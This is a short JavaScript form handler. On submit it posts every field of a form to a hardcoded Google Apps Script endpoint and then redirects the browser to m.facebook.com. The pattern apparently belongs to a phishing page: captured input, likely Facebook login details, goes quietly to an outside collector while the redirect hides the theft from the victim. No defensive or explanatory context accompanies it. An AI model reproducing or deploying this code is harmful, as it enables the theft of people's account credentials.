const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwqu2btfSHvJvk-ZBpGoNC1A4u557Wiy3eYNfuv_Rb1UBXUDDgMLI81urCxAR3SnK5v/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })